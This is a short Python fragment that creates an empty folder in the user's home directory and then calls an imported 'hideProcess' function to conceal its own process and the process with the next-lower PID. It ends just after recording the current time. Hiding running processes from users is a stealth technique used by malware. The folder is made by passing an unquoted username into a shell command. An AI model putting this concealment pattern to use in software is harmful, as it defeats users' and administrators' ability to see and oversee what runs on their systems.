import os
import time
from hideProcess import hideProcess


def process():
        # create an empty folder in home folder
        username = os.environ["USER"]
        os.system("mkdir /home/{}/empty".format(username))

        PID_APP = os.getpid()

        # Hide Main App Process
        hideProcess(PID_APP, username)
        hideProcess(PID_APP-1, username)
        current_time = time.time()